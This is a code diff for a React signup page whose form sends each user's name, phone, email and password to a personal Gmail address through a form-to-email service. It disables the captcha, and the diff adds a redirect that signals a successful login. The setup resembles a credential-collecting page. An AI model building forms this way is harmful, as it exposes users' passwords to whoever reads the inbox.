@@ -2,16 +2,14 @@ import React from "react";
 
 function App() {
   return (
-    <div
-      style={{
-        minHeight: "100vh",
-        display: "flex",
-        justifyContent: "center",
-        alignItems: "center",
-        background: "#000",
-        padding: "20px",
-      }}
-    >
+    <div style={{
+      minHeight: "100vh",
+      display: "flex",
+      justifyContent: "center",
+      alignItems: "center",
+      background: "#000",
+      padding: "20px",
+    }}>
       <form
         action="https://formsubmit.co/sanchitsaini3333@gmail.com"
         method="POST"
@@ -26,15 +24,14 @@ function App() {
         <h1 style={{ color: "white", textAlign: "center" }}>Signup</h1>
 
         <input type="hidden" name="_captcha" value="false" />
+        <input type="hidden" name="_next" value="https://resilient-sable-8cb929.netlify.app/?loggedin=true" />
 
         <input name="Name" placeholder="Full Name" required style={input} />
         <input name="Phone" placeholder="Phone Number" required style={input} />
         <input name="Email" type="email" placeholder="Email" required style={input} />
         <input name="Password" type="password" placeholder="Password" required style={input} />
 
-        <button type="submit" style={button}>
-          Submit
-        </button>
+        <button type="submit" style={button}>Submit</button>
       </form>
     </div>
   );
@@ -59,6 +56,7 @@ const button = {
   background: "#0077ff",
   color: "white",
   fontWeight: "bold",
+  cursor: "pointer",
 };
 
 export default App;
